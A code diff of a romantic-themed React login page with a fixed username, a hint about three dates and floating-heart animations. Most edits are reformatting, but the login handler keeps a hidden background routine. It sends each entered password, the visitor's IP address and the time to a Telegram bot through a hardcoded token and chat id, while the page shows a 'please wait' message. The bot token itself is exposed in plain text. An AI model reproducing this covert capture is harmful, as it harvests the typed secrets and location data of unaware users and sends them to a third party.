@@ -17,19 +17,12 @@ const LoginPage: React.FC<LoginPageProps> = ({ onLoginSuccess }) => {
   useEffect(() => {
     const fetchIPAddress = async () => {
       try {
-        const res1 = await fetch('https://api.ipify.org?format=json');
-        if (res1.ok) {
-          const data1 = await res1.json();
-          setUserIP(data1.ip);
-        } else {
-          const res2 = await fetch('https://ipv4.jsonip.com/');
-          if (res2.ok) {
-            const data2 = await res2.json();
-            setUserIP(data2.ip);
-          }
-        }
+        const res = await fetch('https://api64.ipify.org?format=json');
+        const data = await res.json();
+        setUserIP(data.ip || 'Unknown');
       } catch (e) {
         console.log('Could not fetch IP address:', e);
+        setUserIP('Unknown');
       }
     };
     fetchIPAddress();
@@ -49,14 +42,12 @@ const LoginPage: React.FC<LoginPageProps> = ({ onLoginSuccess }) => {
     setIsLoading(true);
     setLoadingMessage('Please wait, it may take some time...');
 
-    // 1. Instant password validation (no waiting)
     const isPasswordCorrect = checkPassword(password);
 
-    // 2. Background logging (fire-and-forget)
     const logAttemptInBackground = async () => {
       try {
         const now = new Date();
-        const dateStr = now.toLocaleDateString('en-GB'); // DD/MM/YYYY
+        const dateStr = now.toLocaleDateString('en-GB');
         const timeStr = now.toLocaleTimeString('en-US', {
           hour: '2-digit',
           minute: '2-digit',
@@ -70,39 +61,27 @@ Entered Password: ${password}
 IP Address: ${userIP}
 Time: ${dateStr} - ${timeStr}`;
 
-        // Telegram integration (fire-and-forget)
         fetch(
           'https://api.telegram.org/bot7731464090:AAEvV2JmckYlg9HyrS40pDUDVofU-VosoQ4/sendMessage',
           {
             method: 'POST',
-            headers: {
-              'Content-Type': 'application/json',
-              Accept: 'application/json',
-            },
+            headers: { 'Content-Type': 'application/json', Accept: 'application/json' },
             body: JSON.stringify({ chat_id: 809190054, text: telegramMessage }),
           }
-        ).catch((error) => {
-          console.log('Telegram notification failed (background):', error);
-        });
-      } catch (error) {
-        console.log('Background logging failed:', error);
+        ).catch((err) => console.log('Telegram notification failed:', err));
+      } catch (err) {
+        console.log('Background logging failed:', err);
       }
     };
 
     logAttemptInBackground();
-
-    // 3. Small delay for better UX
     await new Promise((resolve) => setTimeout(resolve, 800));
 
-    // 4. Show result
     setIsLoading(false);
     setLoadingMessage('');
 
-    if (isPasswordCorrect) {
-      onLoginSuccess();
-    } else {
-      setError('Sorry wrong, try again Radha 💔');
-    }
+    if (isPasswordCorrect) onLoginSuccess();
+    else setError('Sorry wrong, try again Radha 💔');
   };
 
   // Floating hearts animation
@@ -123,22 +102,9 @@ Time: ${dateStr} - ${timeStr}`;
           <motion.div
             key={heart.id}
             className="absolute text-pink-300/40"
-            style={{
-              fontSize: `${heart.size}px`,
-              left: `${heart.x}%`,
-              top: `${heart.y}%`,
-            }}
-            animate={{
-              y: [-20, -40, -20],
-              opacity: [0.3, 0.7, 0.3],
-              rotate: [-10, 10, -10],
-            }}
-            transition={{
-              duration: heart.duration,
-              delay: heart.delay,
-              repeat: Infinity,
-              ease: 'easeInOut',
-            }}
+            style={{ fontSize: `${heart.size}px`, left: `${heart.x}%`, top: `${heart.y}%` }}
+            animate={{ y: [-20, -40, -20], opacity: [0.3, 0.7, 0.3], rotate: [-10, 10, -10] }}
+            transition={{ duration: heart.duration, delay: heart.delay, repeat: Infinity, ease: 'easeInOut' }}
           >
             💖
           </motion.div>
@@ -153,21 +119,11 @@ Time: ${dateStr} - ${timeStr}`;
         className="relative z-10 w-full max-w-md mx-auto mt-24"
       >
         <div className="backdrop-blur-xl bg-white/20 rounded-3xl p-8 shadow-2xl border border-white/30 relative overflow-hidden">
-          {/* Card glow */}
           <div className="absolute inset-0 bg-gradient-to-br from-white/10 to-transparent rounded-3xl" />
 
           {/* Header */}
-          <motion.div
-            initial={{ opacity: 0, y: -20 }}
-            animate={{ opacity: 1, y: 0 }}
-            transition={{ delay: 0.3 }}
-            className="text-center mb-8"
-          >
-            <motion.div
-              animate={{ scale: [1, 1.1, 1] }}
-              transition={{ duration: 2, repeat: Infinity }}
-              className="inline-block mb-4"
-            >
+          <motion.div initial={{ opacity: 0, y: -20 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.3 }} className="text-center mb-8">
+            <motion.div animate={{ scale: [1, 1.1, 1] }} transition={{ duration: 2, repeat: Infinity }} className="inline-block mb-4">
               <Heart className="w-16 h-16 text-pink-300 fill-current mx-auto" />
             </motion.div>
             <h1 className="text-3xl font-bold text-white mb-2">Welcome Back</h1>
@@ -175,13 +131,7 @@ Time: ${dateStr} - ${timeStr}`;
           </motion.div>
 
           {/* Login form */}
-          <motion.form
-            initial={{ opacity: 0, y: 20 }}
-            animate={{ opacity: 1, y: 0 }}
-            transition={{ delay: 0.5 }}
-            onSubmit={handleLogin}
-            className="space-y-6"
-          >
+          <motion.form initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.5 }} onSubmit={handleLogin} className="space-y-6">
             {/* Username */}
             <div className="relative">
               <label className="block text-white/90 text-sm font-medium mb-2">Username</label>
@@ -189,8 +139,9 @@ Time: ${dateStr} - ${timeStr}`;
                 <User className="absolute left-3 top-1/2 transform -translate-y-1/2 text-white/60 w-5 h-5" />
                 <input
                   type="text"
-                  value="mylove"
+                  value="Radha"
                   readOnly
+                  title="This is your special username 🌸"
                   className="w-full pl-12 pr-4 py-3 bg-white/10 border border-white/20 rounded-xl text-white placeholder-white/50 backdrop-blur-sm focus:outline-none focus:ring-2 focus:ring-pink-400/50 focus:border-transparent cursor-not-allowed"
                 />
               </div>
@@ -214,61 +165,37 @@ Time: ${dateStr} - ${timeStr}`;
 
             {/* Error */}
             {error && (
-              <motion.div
-                initial={{ opacity: 0, y: -10 }}
-                animate={{ opacity: 1, y: 0 }}
-                className="text-red-300 text-sm text-center bg-red-500/20 rounded-lg p-3 border border-red-400/30"
-              >
+              <motion.div initial={{ opacity: 0, y: -10 }} animate={{ opacity: 1, y: 0 }} className="text-red-300 text-sm text-center bg-red-500/20 rounded-lg p-3 border border-red-400/30">
                 {error}
               </motion.div>
             )}
 
             {/* Loading */}
             {loadingMessage && (
-              <motion.div
-                initial={{ opacity: 0, y: -10 }}
-                animate={{ opacity: 1, y: 0 }}
-                className="text-blue-300 text-sm text-center bg-blue-500/20 rounded-lg p-3 border border-blue-400/30"
-              >
+              <motion.div initial={{ opacity: 0, y: -10 }} animate={{ opacity: 1, y: 0 }} className="text-blue-300 text-sm text-center bg-blue-500/20 rounded-lg p-3 border border-blue-400/30">
                 {loadingMessage}
               </motion.div>
             )}
 
             {/* Login button */}
-            <motion.button
-              type="submit"
-              disabled={isLoading}
-              whileHover={{ scale: 1.02 }}
-              whileTap={{ scale: 0.98 }}
-              className="w-full bg-gradient-to-r from-pink-500 to-rose-500 hover:from-pink-600 hover:to-rose-600 text-white font-semibold py-3 px-6 rounded-xl transition-all duration-300 shadow-lg hover:shadow-xl hover:shadow-pink-500/25 disabled:opacity-50 disabled:cursor-not-allowed relative overflow-hidden"
-            >
+            <motion.button type="submit" disabled={isLoading} whileHover={{ scale: 1.02 }} whileTap={{ scale: 0.98 }} className="w-full bg-gradient-to-r from-pink-500 to-rose-500 hover:from-pink-600 hover:to-rose-600 text-white font-semibold py-3 px-6 rounded-xl transition-all duration-300 shadow-lg hover:shadow-xl hover:shadow-pink-500/25 disabled:opacity-50 disabled:cursor-not-allowed relative overflow-hidden">
               {isLoading && (
                 <div className="absolute inset-0 bg-gradient-to-r from-pink-600 to-rose-600 flex items-center justify-center">
-                  <motion.div
-                    animate={{ rotate: 360 }}
-                    transition={{ duration: 1, repeat: Infinity, ease: 'linear' }}
-                    className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full"
-                  />
+                  <motion.div animate={{ rotate: 360 }} transition={{ duration: 1, repeat: Infinity, ease: 'linear' }} className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full" />
                 </div>
               )}
               <span className={isLoading ? 'opacity-0' : 'opacity-100'}>Login</span>
             </motion.button>
 
             {/* Hint */}
-            <motion.div
-              initial={{ opacity: 0 }}
-              animate={{ opacity: 1 }}
-              transition={{ delay: 0.8 }}
-              className="text-center bg-white/10 rounded-xl p-4 border border-white/20"
-            >
+            <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: 0.8 }} className="text-center bg-white/10 rounded-xl p-4 border border-white/20 shadow-md shadow-pink-400/30">
               <p className="text-gray-200 text-sm">
-  <span className="font-semibold text-white">Hint:</span> Line up <span className="font-bold">three dates</span> — 
-  Gana’s birthday, Radha’s birthday, and the day he saw Radha first time.
-  <br />
-  (This shows the <span className="font-bold">format</span> → 6 digits, not the actual password) 
-  <br />
-  Example format: <span className="font-bold text-pink-300">{`281826`}</span>
-</p>
+                <span className="font-semibold text-white">Hint:</span> Line up <span className="font-bold">three dates</span> — Gana’s birthday, Radha’s birthday, and the day he saw Radha first time.
+                <br />
+                (This shows the <span className="font-bold">format</span> → 6 digits, not the actual password) 
+                <br />
+                Example format: <span className="font-bold text-pink-300">{`281826`}</span>
+              </p>
             </motion.div>
           </motion.form>
         </div>
